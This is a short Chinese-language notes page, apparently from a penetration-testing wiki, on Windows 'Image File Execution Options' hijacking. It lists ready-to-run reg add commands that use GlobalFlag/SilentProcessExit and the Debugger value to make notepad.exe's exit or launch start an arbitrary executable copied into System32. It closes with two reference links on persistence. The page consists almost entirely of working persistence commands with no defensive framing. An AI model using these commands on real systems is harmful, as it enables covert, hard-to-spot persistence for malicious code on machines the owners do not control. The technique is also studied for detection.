# 映像劫持

#### 劫持程序退出事件 <a id="h3-u52ABu6301u7A0Bu5E8Fu9000u51FAu4E8Bu4EF6"></a>

命令行

```text
# Use notepad as example

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\Temp\qwqdanchun.exe"
```

#### 劫持程序调试选项 <a id="h3-u52ABu6301u7A0Bu5E8Fu8C03u8BD5u9009u9879"></a>

命令行

```text
copy C:\Temp\qwqdanchun.exe C:\Windows\System32\qwqdanchun.exe

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "qwqdanchun.exe"
```

参考文章：

{% embed url="https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/" %}

{% embed url="https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/" %}



